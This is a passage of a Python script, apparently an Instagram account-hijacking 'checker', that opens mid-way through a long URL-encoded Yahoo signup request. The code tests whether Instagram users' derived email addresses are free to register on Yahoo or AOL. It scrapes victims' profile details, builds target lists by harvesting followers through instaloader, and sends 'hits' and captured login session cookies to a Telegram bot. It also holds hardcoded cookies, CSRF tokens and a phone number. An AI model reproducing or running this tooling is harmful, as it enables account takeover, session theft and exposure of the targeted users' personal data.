%2Bue5WascNjoib19LKdSMi4LHFwv%2FxIGNfwkKPK0ZJPh5oU9lPpk%2FvFOG1%2FZeNbTKuOnyMwe5gqiI1yV36x1ofQ8vPSYnkUutqKqH380g7uB5dD2aLLU7zlYJtAZ885R05T%2Bw8T3Iade3rcedpF1KQovSp2QCuQMQkni1IzwlmlgXg2ZAf%2FCKV8BdNbQ%2FmXlVqTeYcaHL%2FPnkX3owWh9kuOLzQL8GoaHsyQllb1xMtV1nABcqz2qUEFY%2BM%2FPWvTlH58E153wGMA3oepSW1hYnwn9%2BceScqCnc3UmB1cInZzBIS96Yta2tni4W0EMV0WJxkNA0qerfqYi1OT4%2F41zZwkw5J1Zy787hl09C9dyLKdBK4hnneOX9L2LW90XMDwqTr%2Bz0hGXNUlXTcITR3H%2B58EWZ0ESvVDH8e6El%2Fany5koCyW83SWmAwq8pAK9YUyYfIFrEgNglKHtl0e0d%2BlSusUxt6Q2F30p2MjGlOmoEgYGn5f0HZkhsjRVAsuKebZUsLD7b7S%2B6ET%2F3qUJOIQNz8BUTiFgF6SbZPolHqxLaTcWFx5%2FrxnfU2Bh%2F%2B21jKIANVaugXIiiZyMydVtMOHfSq%2BqEik1jiP5LR82tKYprATx8DlRM9PjKt2ibk5ivewQ%2B5nId%2BFgHujcoUZ7UF%2FELmqIzEzsy1PjJnoV4PCEhRzfR1l1VMbdXfECeHHDFGXFZsxRfpOC6Q0oj%2F8oJo6HGMCWYtzjyr7Ps6ol%2Bbu2sRAMCwm3onMbMVJdMA9PMKtniXnKfKRSTRoK7L80GkIG%2Fu0ArWBogkXsgZb5Tnv%2FetY2oscbdOpNu1Twoc2U61XPrjM%2FD8JhvyifZnHE9klP1cDG3X%2BgO%2BWNgDWPK%2FMbcBV0Nwf8t7HSMfZhlnnZi%2BJDbW8y2OyUN1pIVuM%2FBfrB075p59CLLkmRT%2B6uYwwY0a9MWd3qcFpIoexlFnP7wlRB22Y%2BudF7%2Bg84rYheocLelkJomFmxxHL%2B4AepqLrGWUU9X7ci%2BoKVKXGi%2FYYjcZyPGqDXpu2A7oAZ7sXWSlK3D10k1%2By0jt3D2akA5pzj6FnEkuOcEo8r1LRAYvRLWJ1OSvgf98c0H0IkSYMHF%2FD5fl4LXa%2FI3dQE1RTkc%2Bd%2Fu%2BScq8DiFYWSBerKYgxcHEO%2BhX2mbxKIXW89Pqf96qrqVSfkPAASWLyWKzsxCkC1unlbU6KaeGFbAj%2FAQTXbMciT%2Bu2qZoZmBDixgqNAuXkNCyyW4HcGRJChc3eeWyVRyOkFPvtWvpnAXGUnED5sVbEy9X2DtuWrjhZzKyO3jHA9qL61LaL%2FLWZ4ic84m68LQPbTDESug4dbolKs7NpzhZxkmF09w%2FztEIyZXE%2BqWdeb5LKAzA2jmwoMFrKXcQ%2BhG6Qdb7mr2HKFWAhd4YuEVy81Mom9P8zZ3Xrms1W5UQ6mBr4WQaL1B8XwefKx%2FRE9kWzouUiuCRUaeRELdhGfnXbaCWN09WVWyahcz%2FDbU6%2B4LOPuxtFWPb%2BI0mfPxi6UlRxOaXPWgM239c2UP2zww4aO4P3YiWgVOoNm8%2Bg5ZTCfaKosPF9Xt78YrCinEJs6uzzxDHRSw2bwteiRoErusLigcPmfRhLqa%2FgUovUeM35YuA4unSvK4urvHf1mfqvSyWv6WnNZqUNI%2BKvVsDMSr%2F1j%2Fuy3vm4QgGmzbSoNxFOpR334xZCy8T%2BdvE%2FfvMUVx72pqJ8Fk1NtH02CKh8UOp797jSYlzFTgTz7ynK4cf3cp2k0rCJdeYoaQYPEtrGrkqkvhMYIBQHu4mhuCGI2V17YOIviZB8Bc2TawZsOVtbhdysUkbp6Xx6LTQjiduBvdfosQHmmbNVGgMZgF9L91oosmJZMf8e9Nx%2BDeIRRitk%2BuB7AP2hF1V20ZkD5WcXBl8pFPbnthEBC%2BxekzL8lvRrEiQMug5fidQLyp4Sza%2FNJsdbSsAcnBTANHHPMQthg3VBdWUYynDXzvQJ%2Fvd%2BjVuY4MinVmNpvf%2FQfO8GuRiqonmxc6fuXAX%2Fq48L7TdOiUnV6IoM20qmigxeUSiB0boTO31G%2BBekm6mFqEAgX%2BDAl5%2FpwiLjYd8gU4bh18AUqVtC97kZ8T35jMubEMWCiPfU7UFuHypy5%2BrZFmwQw11mwhqcHGYmywcFWeJMoZJUEi5YxUFiCzofKwYX1%2B1HsAUTrBg3BBzne55SHRyz%2FJ%2BLNYs3LXu6FcAYVierFp37idIeZyllw%2BcFXcmO3s5i2U4iRaNuxccOhNIXxTdhDwwihpWrlqISp6C6BJl%2Fuo1ovtmLVTAxHQ0wSTU8kKGJ3zFLLQXxd3QHH7BgSeI3yucwLcnpyCP205jXq2WI0iicLcUWpGEs0U%2B6XwF4N3fjv0niQxnrIJkBwC%2FIvk0h3Zd%2Bm4Etxzw5skcIdJSqbS4B4Bfb2RmJFI4J4L3UTDTJxmx8YknfTNuCN15xvlFOkX90NUr%2BVOQc%2FjVanwscXmCC8J70OCE%2FtkB3FTnCA2BGVnpdcCKITruszBt5V2GcfN1uMDq5qDBdBjAQ2YczujTbJajWe9KnzOaDIeLZDePEQKox0vTlLwiDtmTH6fvz3UA%2FOzqJV8wv8TbrHdkJ7X7vh3L89iYYMWX7wrKhqT5MsqNcFK9ubZ%2FSWOKuXuRv6iut%2Fki4ZJX6nKidDxVfp4ye%2BxIbs8qWeDy1xqp33K41dP1yUVG5UON68f4ol1099%2FRnv5WKDDDgbn6opoWHYwzQoFZTwRGm2pI3%2Fqs0LyoTlb1kJglK8rYRrl4DghQaMPxVjyKMOl5HAkne1nI8yKqnW%2Bwixf5e36z5C5KIU1zAwBv5k69Ml13axf%2FPl%2BL07Qf76H6FfCIlQ%2FjHld%2FACM6rHFUZnDGEnPee%2FxDMlJEfbtUsi1glhWJWDkxmx%2FIT4GXDTvqP1kRfqicxPTYflq15eXXK5zFZSUXXI9M4xcP2%2B9qvYx1a6qCwYyVfg%2Brgl2QvYWpxXxe5Z%2FS4am4P07LqwowIJ%2BaMKUiNkHgvCdy5o9ff1q3jDsBnXXhVPjtSeUAVXqEdy0t4txIJi3iXQ0HEEm6QIENZOXpuQrUfmsD3xkIRTQHVA4mMhfPxOUziwlXgTwXMwlN9mxwBVo1QAWEpBZExAvbW86IBwBYQ4%2F8rHqbfIKDrXItMyzKoCzou5u1lT18D8n0UI7iVSFzvEIX8%2F9f%2BGozz23E%2F6MKXCFVQHjQaOGqQlixOmgHGCA%2FCBQ66VNCx4%2BikMuPJMPZrV%2BFGtjsCpBrRnkmiottJAbZNLUiG6W%2F8QXmFCYPB8mE8o1kv2Zh%2B%2BqX46atE7nPIaddtpuCEaBShp9xltFB1Cvmjj2pTOxxusOtS9ZLuPYbTHb26encYwJnvZ9aWFZu5PgoEsGoLXrUrYnBgcG9KLIrwAnYCIySbTe6uZqJuhlsOtQd1h7Itv69uy5vQNd86pMNzKJCjDHuz77OmJYagBKYNrrzf3smXZRXMd91t6o6%2FSAeKYuqbnLhld%2F8YtCFEV1ayuzvEoKlcPmtbf3RCYFrywdpH4aScJ8gsA3JhL4K5rQV5BNTh3BXGg9g%2FPJIjfFM%2BjRwHd40DINs7h480R2K1nV2Q5JHRA6IJcG1b%2FBwVQcNig4oijO5R1bqBJlatva17Qxv%2Faj8v6zEZL6UoAE6eX8PZ9A1oQ5Jmbk2S9zpOvX0SGuDsXr7Dc1GlmnzmI1RAPYNv3rtSTREZMxwk0WRRMV6WF23Vs7jUqfESC8lqlyk9PV%2FlU9rp4DwVULn5Op12pC47CMj4Vez8dmB3fX7eHo9OvkTq5wKFOpEyuzrI%2B2ZfXnuw9L0WA1xGsfpv%2FrJzZCnh2LxLmPigu03mOTf6zEXwqUiATSrOer58pgfLtpPoyBFM%2FxOSzRtiUxTRUrgDl9eNUr%2FFMcqntBpUckqYOu%2Fh673b1sPCI%2Bz65BvuF2NfHeJiWlW9xAgxv5eE1yG5FCdVoPiWJRiNVjvqvMc4Rd4gZ2hubkcohPtPydyM7jh8FULBvXb5tSHUlh945luxwCv%2Bc6gKB3F1rE1S0uAtcZUeLncH14pofWY9w6REAe6D%2FkPdu9QSaybR9%2BgUP8Ip5ZScZaZEOWFfcw0mD0AXzYT8uYnmOJ48ivvoimcIYQYnu74OMG3NvnO%2FpyXEYrgfxZ0mNsqWKZp9qeygN5gqtH7GkMwmBwGLs45l%2FcIRX%2BGBy6%2F8JYdgJHqDdeC85sVCkFCB63N1sYATamcyLHflxX5Cb6LDLDZcqEYAuG3kwRo1uGkEqysTq6xJWi0qN6ZqbEk3ixICG5iBD2batkP%2F5XuWZ9E%2FT5lBSffh2fC6Zo%2FL2KrcejHirop4GIPIMJT2KTd%2Ffg43Q8FYN2lGve4BlORmVlAnCKxhTcYH1QmmAijmS0Alpmt6LO%2FSmTwV%2FO656XmYcR2dHLZFnJyhYbYDdbxOkEO7siVSB7rJrIh6EvRX5n%2F7Zm%2FGqQo%2FyxX5B0HUPbk25HH7yBQi8oFprLCBSlolyt%2FVyTMm%2F9WBkS8o9RN3%2FrcQDs9ZdYFoZJ28QbFhIAGq9bX%2FHN7CSKKe8ODnUwSxPGRNH0ta2odEvsZnVVsCZXnQNHAG3cKi1i%2Fdd%2FWWEtx3%2BaaSMrwU3AGmo%2B2tYIOIzN%2BO18K%2FVKX9PP7l7%2Fylu9bJDw2sL99DH%2Be6MDnc%2BbfdIoLxk6vyf8xBSVewQChF%2B8lX5%2Fku%2FT%2BkPamn%2Bo%2F%2BYg5JrBcbdvJD%2FoT%2FdP5zkNd4IGhg2QTEHPZdshhMwVspaMrzE%2FRnF3EgXX1H%2FGTXcpzFirJYVgHsrVVo8hvGnaB4D7eObPdKQrAg2an%2FBtqXVHk3hLurkeB1CFmTCigoB9G8tSG0grIY8CDhUBGwiLl%2FEhS2QK5rUhSzrYrv%2Fw6g0uwy0XfaHpE%2FXSlFKlUy8XKSRRHidFzakgLLO7i8lT6b4XhtH1c4EsctXMfykTgTtj%2F59BIkXdnYOwaz%2BpfMNn0oVgPmeJ59BFkeQUSPcYLX8oTyKdGZKyx5USDU2poXyxmthkRXf1cmI8EYiQJppSNFfIZwpb%2BsiMauJMJ4BozCPNrDzR7XLbM%2FQt7kf70ynHOXqGKetd6T6lozjJIf9xTO%2BR3XL4ZwBmiNVBvUg4nIBDHRNZpNIW6hap%2FNQOBCLpShxtUztE1fXcMP%2BqPqTyx%2BAvmOZOrxwDOtTXjPYUsXid%2FA%2F6joanvP%2F4jfNR3DCCnWVzFh8j1Cg69hKRAp8t291%2BBE%2FiS8xr%2B4Szqy7eUrGqohmPGm9upFNrQupUz41%2BzQ4VE%2FqsaQhe8HY%2BCoveWZpK%2FJjPNeNf%2BnDqjR3DSETWjkTlWKsqPuF2Bl3dbf%2F2gq7SoNsfFp5FdvQyh6ich47SHGnJWMKtQCLcMOdKqEos3IPuUw%2FIusFM%2B5i8TDRTNIxHRMk2r1LhOKN%2Ba4GZCt3i%2BcDD%2BauvlUYfi8S3Y44KNrJlojtwfW2byCV0Hd2xCfJ7VGr9yna%2FcIW5JJhbA93qdRhLbKNhlGfImHwjR7facVlK1nTdbL38deXOjc8dVpxbrcO%2FcGbS4F4yFEyeJpZrigWltg92wqKRaONrOkI1yJAR50lrTodsKSiivM%2F2xb6eUhU5SM5VHCOe1xUlihsvBznlGGyZGNr6xkVtIxHNyhQ7v4QuqxzKd4Oi9L3QykZsOT6WlxWZm8AOmIgbQ9X2%2BiVIguQ8wfRwgqJCfANdPmM3Fvl3DQEzHqei89CdjbvzINTN3%2F%2BLGTrewxVaXTRgtOxb2AlN1o%2BJyDg4u5gCA4pHQ1Mhuf9%2FZNcrnpXIYg%2F%2FEoORSKeO4jnhP9rs4KBdpmq3qa%2F9ZPPLkSpvt9nVUNBWejdBCoJTRmfX0UR%2Fi7AdTjxGl8lVfLX5jK%2BL8WTsMslbblVRkH8%2FshMpoZeFImUea2nzDk25xqDUn%2FOVWIc9VysBF%2FKCdqheDRo2Wcy4bu3i6%2FhcGJhziZrM7BOl5ba81JHsHAnVOvSB5Inz2raDqpCrihNF8l5XvvT0k%2BJcqGNz%2FcwtR4sP6Pxx24sJMzxQiXJggM7R03043PxboZKWfJ%2FNAaoA8IZTLUXDSXnM9RCH8oC9QkYNyMm62ebbtuI%2BbEG2s6aoKWA%2Fj8hPnqy2jySuKcuxWlEh%2BXNVwA4cFaOdUr%2FP7Q4jrjBzkq8cfHRTYQddfOJFlecbArYlu4DaxtuLzeNvcxR1RDOQU3YLJVnpfTWz0TECKN2rss1ECyZaQ44PRsIPSKsuoit9iB0xxcI4MXNfXQNMRTvcwM4fsREGbpt7Qg%2ByQk4r6r1Abj0ly0lAgGRTAax%2FHDh2v%2ByLrhmPF6QFabcX4CxgVHwxxVKk%2B%2Bura0iNIcuCyyXfjQGKX8CzWh0npVADE0KhnNC%2FIA5DeZVYXUsHQHCLLs8aDvnT4xdeKjzniH3UI21MV%2BhCMI6CGqF0oL%2Bkpk9lNv47ZbgKTuIvUo34NVK5QkIwQVht%2Fdbm%2FfqqynvoxL2eZZoTIGUvdLt9Yep4E6W4lYOUlHGKww9clV8S0R6%2BwavhXLWva%2B5VT24E%2BRO%2Fx74uugQm0ECCvvlPZgYM%2BbBDqwXpZlAll9TycAFmh%2BJBP1xzYQ7ytO8A5Fppt3ZZ87hnKEKNM6%2F%2BQcetJyZrgYVvfHBFGI824dsrErWbD%2FuFzWrClhiSsZJVWFgyYLD24Zvv2hqj6sSA8wz9W0SlXfwA0MMzJYJc2c1GdcyitYX74z%2BGHxp9WXybqlu0GHN71rQN7FQLApQeUZII40GHeUyXQDmnzuo7EJdP0MVg6UBW1GrMmo9OQkn2IrAIaOODlNHvnmueo3mGuYGRti2QPLoOSWyO8XGl7WNPvEchWJS7BKL%2BBUuSCdPosZy%2BuF%2B6U2ym1FtCBNvmNxILAsCL1HOpXhtdVedQX0LAOQIMOBnEGyMdt%2FNDokI0nbYjoGG29eP5lnMMNbinV4HXSOvqZoYK6Zug5nt5hdRY%2BX2fMvK%2FNX4ZbWIcZjije6CZGkrn25OmUQiZUBXv4jp8jqEA7vAJMsKeKBuaPh2IxK6oeciPCC%2B8eSzn8z0YEumeEj9LLyc4XeDxKQcWVQrPHvBAevdT2biyUesKIn80rnPktUSE36%2BLC9rK%2BP8Sf80HwWUirAvOnAr6xOdFJTeNS2GD2%2F42VaZvv6PMKSp0Yg5vrGToPPNEVC1LIGOVG5MNVnFuQKAkpQjPV12%2FHZPgWv%2F4mp6Mjy99k4%2FNxfzxKMfQu%2FKZ8XoVwHzwXGjrKOi1PPzDTY%2BfnnE1owH6d9LxlTrV3JwbLJU%2F3hGi01ktWL4pJNLpcwEncfcCyHOx41KiMgKn%2FIaGcRozmvqqvcyry00VJQF56HOYNWIj0Uxh%2FJ%2B5hd0T1tpI54J1h8y%2BOn6vK%2F8DsVOIebtsRbxwFdWYeM%2FqcEDVUtctJkJRNmNYa4mSyDiTKTsD%2F%2FQOfU0qBW%2FAIht0hHRhIJoxbIawuYeh0sNvOCFRiXl6mHtSYhYX5SWgDrOHLw2Q0VdCYiiVuji6AfbAwLADD1UkTkGYRGr76UrWahgiicXLIcx4Hvnz04N%2B3jR2DUONQzCl7XqSQ50k%2FCv3SULW13XL7a5Kd7jepA%2BCL9Vr4xQ34kTl16EdOrAO%2BSUcMIuABnkWlKgb%2BVSy5j6hy%2Bpt0quRMdfnisZqwnTdjMJ5Lg15FLplRV0WwInKqUuwzmr4eudCrlIbezmseC7y3fJXO%2FPzi%2Bu1bx0Vd10jVnQE3oTKEsn8WEWGyDa6CrZMshbn3imNxYtHp7i7i9otz8JZ1soz2srzMo2pPJMfXxavlgiffWI6hG7WBZzvpbBrbBOZ9MWKKWraJKRDu9mTAB%2Fg3rf2bnh2bJtLnQt0%2BBhvwpNDsNCBySRh4wtITxvCp1hYSWY%2Bd276c4sERE%2BvZo4v0NHZiEdrLZQuS8FCrc3VcagcT%2FkD0e0IqtFobE2MYUoTgIA92PUpwG2Iex4Yn7%2FI7PPyFwa%2FfPlLaHaGCcTmFclGio7Rexb%2FKy5W5%2B0zCInmFnyX2OmN96nY9nRWxRv08WARSl3DgtV0jU%2BBTbHUc%2BRVO9YdznpO3VnEYAJFEFkDZ06UuzSaGNesxlWLi4lu482c5i7K7PAiMG92%2Fk%2Fd4z815q92ega8IuXmWAAuKoLBlYXDVGO3wYzWpv6znvma9ZZl93Bu5ygTAy7CvCNGw9DCiPeFvHHba4tiYviSTwYrvKFAa01qYayvNnrcJ%2BtkRPHBlD4GSiTuQebjqMoOmXygvQsNHBMZfmCD8zqtu23bJ3Z0aOqX80v8p%2FroYKOQkkLMG7KHIEbukV2D8BQTRF6ypF9hhXnHdueOyckqLjmUQ6%2Fr12PIlnTgS0XqWcrrGgHtZJeOylm9Jqmx80p%2B9aj2xPVfvlP6Sc5wTpq61m%2FIo8IaN%2BHdFOkQ2ZBAzimqVlkf%2BIVLsxxF0MUsty3kzNIcs1yid0ivqRPtXFS3rOXuDVeP24aIZkH6vH04LZXs9IIKXLOEDuWgQZ3Jb7dMh5PcVGZ8kqRXhrF1zkF6XFBYX%2F7o6IBKFoMJGH%2Fp%2BEHPEgV%2Ba4NCuYpmVKdCYV0tORqMP3bdZaXEfgTXmCuLr2K%2Bdh4yOp%2Fu7DGrWbaUhPLfRLB0wBo8spFPpoSZmZK4VMm5Yz9eizh5G1nXO5Ts9P8R9jiVqhrTFwcrwnEpVPQe8wKL9Wd6QyHaBecyYkUlJZ88ZRgIPijHDxLhyODrl%2BfngJewh%2FyWm37R9edAdmhtwSm%2FuOHeZYf9h0YAcCxKEgPTO0zdsuySr4HrvqcZF%2F2pmsua4VR0dxej5dDkX9JdiQb4AgXLQ3BJfkNdadnVHmG2wCgtGA2Sw2f8n22g584eoN0y1USEFoyhQigFW%2FDHcOqjoJdGge3Be5FBHo5Ye7jfKCvbuhlF9wOg%2FROOWVHCb6%2Bpc%2B4uWeG1a3i%2Fwgh8Jr38okT1CK%2FjuEEhGPztb9SCjPpnhf9S42E61ItaWucoNwWF3hTFWlLmtrOWZ4rNTgxHU%2FEpA%2BhriKjxdRUZeM4oTViAAtukIoz9TI%2B8N2g%2BA8WeKqdosk%2FhIiQtr3yFGnBYMiKSl2NWu2zTkweWuaNTdF90lm%2BSyn7ddAQBTlbiIKGepnihTiCrm%2BemWMK%2F5TD45L1v63zAnUL4en8s6tCEeGKfgDGaG1Z24RawwdE9EdSN8lUzQ9nEKldeNVRm2uq%2BIW1GPsS4gcCC8qPXvFWOak08nG5X1E2LAJVkAXeaJuphTCyo5UEQJCfgvJEodJagJj1mJ5a25iM1YfWJtbAYLOAYMwEXBL8tCZXHfQwsfkFC9KVAhdSB5%2FYRE4i0Z84KFAhtr%2BabsjfW42cLdL5fUN6VKbflxtol9%2BHpbijz9CuyhT99RHUiXLGOeFjpuyL04wJuREY0V%2FUAywVBDGmauqWEgI8Bv2Wo4CyxSKOtMLPiCHJ4Riu6Zs5SOXp9Dlucoe%2FpMMjT%2BdVEhQ9VvPkrJW5mYMu7nhq%2Bu9wdTBmjWRxt2KOCpsEJEk%2BoFVYEcd8e3Hu8ZMGdWpMUBoEL5AdFgSQIiMQWVXt1sLnlxQQL5%2FTfTW9YcBvK0UMLmIxwSkSH%2BzxS6gz3Vi5oeBT8A5neQ1Vwh27nKp2Lpk0jgTDkUWocmtILl3xEA76%2FQ%2BQR8DF6%2F%2BAp3xA4M0VDpgE3wsIZwjsjbuBvad387k%2Fcj%2FdxL3rfq8HBleUAHzl%2BVeSY9l4e2djuA9sweGueMXsq92xdZ5l5T0W%2FE9bm%2FVDP%2BzmioRE123ESFMaXMwmo4FfNEpCUqS6gmNkJlCfo4jNAuVoOvB7sOk4kqiwU5Y3QrcOuB8YwXB4rulkEEANF80hFPstTt5Mrgy0KVl0FUAnGjCDx3VBpKrqtn%2B8uPZG4GJwUVt2tybYzsNy%2B%2Bz8TjExziL9s0zZRSVa%2F8wVz%2Fx6zVs8w5EmtUZUJJSSVx%2FrGpxKcMuB%2BCvsp3QA8WZZoD6vz0ik6Ztays60ecQGJRi%2FExrKMbnq5M3KMcctvii4q7PbjRWMtp9dkWhoQvdSraKONKUukuRO%2F0nLN3QVAxQpi2i3z5CqXZ7R9i04uxYx%2BaeyIuRb30HP0x7H8VAZTmIpPHFVPo22%2F8%2FeyG%2F%2BuzbYa95k2GUiUqvr3az3YxbtqsDAmflt4smp6pgfSJ5O%2B5B1XSatt%2FWxuowILkQ%2Fk7zHqJkS%2Bsig0ET1mnOp9YwnfNeYYM0K%2B%2FnMuoWDanE5N6voySbrwL1gewWqlh1CaHSkopKLbgGYrcSNx%2Fs4jvtcbhdGHflkFesVgaZbFt4iq6Z%2B3z85BZiMxFvNEzYY0dOJsA9bSaXbUsATXdkXu0xJAPHul87Qfh2MSrjuQkkAGEYSQotzjRQbih5DjyiEgNq%2B%2BF9YQ%2BanS1p3vgYpaKyoDk4AFYnjQPRNjwio08YSHxjV9jLLny1TlaKsyCJj7x7mA9EkwXpR0HrvJCI4HN0%2FCbiV2tbBuvxpmp0XW8DHbiSBFykaO%2Bo3hMz28TWMSxcaEkPAVVPqa4iNMVmpbcksExTWlcnkJE%2FQzHUgtlZjiYJyzP%2Boh6GPvTwEpQCulJhJz5sV0exXDCj9SfP9KIQA4ceemRModEG%2Bui%2F5i2vK%2FyWqGk5CZDz8n0Zts57vdcgszUU0Q9U0i1eClzAQThFEtoZ7kKlCeD897gMgEnBAtXpLliDf9hJPfZFM08ZQmn3DzoLSUzXZiCDLl5vfmNCg%2B38tBqLMpE64leDuGBBhuMiciCObKNI9Km79qvLuEwp5RYlAle8%2FmhPWKdmjIrcdoO6bdVbpA1whM0QLcZDL0%2B6LKkD2S9%2B7wREf88ynb0Pc%2FxZsBunc%2FXpIuLsv0bE4d9TWVjkNED2pZUDJ%2BzL1DRb12JGJfeyjtOs3MCAM02HFEioW8fa6S8Dx66FxKXUVAE69VbWAOtNqJWiiF18MZ8V5NUgWxiivkr4nf9wXynxMmcUJlQlylvVsJYUOFdQ2CeRIvN%2F5adzasy82L7WMV0Qlnba%2BGiwSDHzZrvW66RMK994Hb0wZiDVeRU5Wez6OoHdqiV%2BFV%2BXYg6tyaf783cdrNgP%2Bie7jIRNAkrRu%2FvEzwLjFfY85w7iL%2BLbACmtsXfYehVWD19Cqjjm21AFXSK3lOJQDfSb3yUO7b0uuCbVlzIF5%2F1MXEBp%2FM6qS63ZEutY9v1i1i%2FS%2F9%2FEOo2SNUFtLiAxH1pHNycDmGGxq9Cx0vFjkpzB25DrCiuYFn6%2Bjib%2BLmV8DzWPIslM4G2c%2F9Rwmv2LOvkLYsI3AYFuGccr99WbgAcIItRZn9qyfzyP7tI1AQGcPPcefWjOct#HDgLURq2EszkDhZFm7S0U7veL6bp9pduwJBT7qBV4OnDqkYSz%2BFl6WQnWai%7CWt01JXqufq00jQOn6sPJiA%3D%3D%7CLuskmpN4HZ%2BfFTJdCk2ftg%3D%3D&tos0=oath_freereg%7Cus%7Cen-US&firstName=uu&lastName=uu&yid="+tik+"&password=pkwwhiaijwwh&shortCountryCode=IQ&phone=07849558853&mm=7&dd=1&yyyy=1972&freeformGender=&signup=").text
         if 'bad_password' in res and "yid" not in r:
                req = requests.get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username="+tik+"",headers = {
	"accept":"*/*",
	"accept-encoding":"gzip, deflate, br",
	"accept-language":"ar,en-US;q=0.9,en;q=0.8",
	"cookie":"ig_did=E216FCAE-3C47-471C-AB2F-D377B8091E28; ig_nrcb=1; dpr=2.25; datr=zFcNY8ic1_0Zt9CTOz2PrfX_; mid=Yw1YLQABAAEmMXeFTgUHfw-N8u1Y; csrftoken=bVOP67kvfqUJagmCKcxDQ8OCKlenCArl",
	"origin":"https://www.instagram.com",
	"referer":"https://www.instagram.com/",
	'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"', 
	"sec-ch-ua-mobile":"?1",
	'sec-ch-ua-platform':'"Android"',
	"sec-fetch-dest":"empty",
	"sec-fetch-mode":"cors",
	"sec-fetch-site":"same-site",
	"user-agent":"Mozilla/5.0 (Linux; Android 11; SM-A022F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36",
	"viewport-width":"320",
	"x-asbd-id":"198387",
	"x-csrftoken":"bVOP67kvfqUJagmCKcxDQ8OCKlenCArl",
	"x-ig-app-id":"1217981644879628",
	"x-ig-www-claim":"0"}).json()['data']
                user = req['user']['username']
                name = req['user']['full_name']
                follower = req['user']['edge_followed_by']['count']
                following = req['user']['edge_follow']['count']
                bio = req['user']['biography']
                id = req['user']['id']
                bus = req['user']['is_business_account']
                private = req['user']['is_private']
                verified = req['user']['is_verified']
                posts = req['user']['edge_owner_to_timeline_media']['count']
                res = requests.get(f'https://o7aa.pythonanywhere.com/?id={id}').json()
                data = res['date']
                info = f'\n email : {email}\n name : {name}\n followers : {follower}\n following : {following}\n bio : {bio}\n id : {id}\n Date : {data}\n posts : {posts}\n business : {bus}\n private : {private}\n verified : {verified}'
                print(G+info+G)
                with open('hit instagram.txt','a') as hit:
                    hit.write(f'{email}\n')
                reg = requests.post(f"https://api.telegram.org/bot{token}/SendMessage?chat_id={iid}&text=‹ ѕᴜᴄᴇѕѕғᴜʟʟ ᴇᴍᴀɪʟ  ❤️‍🔥\n────── • ✧✧ • ──────\n{info}\n────── • ✧✧ • ──────\n- ᴅᴇᴠ •@H_8_K")
         elif 'invalid_user' in res and "yid" not in r:
                h+=1
                print(f'[{h}]'+'❌  '+R+'bad insta ==> ' + email)
         elif 'bad_password' in res and "yid" in r:
                h+=1
                print(H+f'[{h}]'+'❎  ' + H+'bad email  ==> ' +   email)
         elif 'invalid_user' in res and "yid"  in r:
                h+=1
                print(f'[{h}]'+'❌  '+R+'bad all ==> ' + email)
         else:
                print(res)         
def gmaillist():
    os.remove('username2.txt')
    os.system('clear')
    print('The list has been deleted')
def aollist():
    os.remove('username1.txt')
    os.system('clear')
    print('The list has been deleted')
def s():
    os.system('clear')
    token = input(" 𝗘𝗡𝗧𝗘𝗥 𝗕𝗢𝗧 𝗧𝗢𝗞𝗘𝗡 : ")
    iid = input(" 𝗘𝗡𝗧𝗘𝗥 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗜𝗗 : ")
    os.system('clear')
    email = input('𝗘𝗡𝗧𝗘𝗥 𝗘𝗠𝗔𝗜𝗟 : ')
    pas = input("𝗘𝗡𝗧𝗘𝗥 𝗣𝗔𝗦𝗦 : ")
    os.system('clear')
    print(logo)
    req = requests.post('https://i.instagram.com/api/v1/accounts/login/',headers = {
"cookie":"mid=Yv-bGAABAAHbtYpz4QnwEnkdbCE8; csrftoken=DxM0ocw6vCs8neuv2VHTwvjwQC3xuTJL",
"user_agent":"Instagram 6.12.1 Android (30/11; 360dpi; 720x1339; samsung; SM-A022F; a02; mt6739; en_GB)"},data = {
'ig_sig_key_version':'4',
'signed_body':'043786d728db32faeffc465850d761d89867818e36fe42e8ebea347884b66b5e.{"username":"'+email+'","password":"'+pas+'","device_id":"'+uid+'","guid":"20d06c67-b663-48c8-9c29-86e7f1be21e8","_csrftoken":"DxM0ocw6vCs8neuv2VHTwvjwQC3xuTJL"}'})
    if '"username"' in req.text:
     ses = req.cookies
     sessi = ses.get_dict()
     session = sessi['sessionid']
     reg = requests.post(f"https://api.telegram.org/bot{token}/SendMessage?chat_id={iid}&text=‹ ѕᴜᴄᴇѕѕғᴜʟʟ session  ❤️‍🔥\n────── • ✧✧ • ──────\n{session}\n────── • ✧✧ • ──────\n- ᴅᴇᴠ •@H_8_K")
     print(session)
    elif 'bad_password' in req.text:
        print('bad password')
    elif 'checkpoint' in req.text:
         print('secure acc')
def gmailfolr():
    h = 0
    os.system("clear")
    log = pyfiglet.figlet_format("GET \n LIST", font = "slant"  )
    print(log)
    USER = input("enter username :")
    PASSWORD = input("enter password : ")
    USERNAME = input("enter user list : ")
    L = instaloader.Instaloader()
    L.login(USER, PASSWORD)
    profile = instaloader.Profile.from_username(L.context, USERNAME)
    for follower in profile.get_followers():
        email = follower.username
        h+=1
        print(f"<{h}>"+email)
        with open("username2.txt","a") as kl:
            kl.write(f'{email}\n')
def aolfolr():
    h = 0
    os.system("clear")
    log = pyfiglet.figlet_format("GET \n LIST", font = "slant"  )
    print(log)
    USER = input("enter username :")
    PASSWORD = input("enter password : ")
    USERNAME = input("enter user list : ")
    L = instaloader.Instaloader()
    L.login(USER, PASSWORD)
    profile = instaloader.Profile.from_username(L.context, USERNAME)
    for follower in profile.get_followers():
        email = follower.username+"@aol.com"
        h+=1
        print(f"<{h}>"+email)
        with open("username1.txt","a") as kl:
            kl.write(f'{email}\n')
def gmailfolg():
    h = 0
    os.system("clear")
    log = pyfiglet.figlet_format("GET \n LIST", font = "slant"  )
    print(log)
    USER = input("enter username :")
    PASSWORD = input("enter password : ")
    USERNAME = input("enter user list : ")
    L = instaloader.Instaloader()
    L.login(USER, PASSWORD)
    profile = instaloader.Profile.from_username(L.context, USERNAME)
    for followee in profile.get_followees():
        email = followee.username
        h+=1
        print(f"<{h}>"+email)
        with open("username2.txt","a") as kl:
            kl.write(f'{email}\n')
def aolfolg():
    h = 0
    os.system("clear")
    log = pyfiglet.figlet_format("GET \n LIST", font = "slant"  )
    print(log)
    USER = input("enter username :")
    PASSWORD = input("enter password : ")
    USERNAME = input("enter user list : ")
    L = instaloader.Instaloader()
    L.login(USER, PASSWORD)
    profile = instaloader.Profile.from_username(L.context, USERNAME)
    for followee in profile.get_followees():
        email = followee.username+"@aol.com"
        h+=1
        print(f"<{h}>"+email)
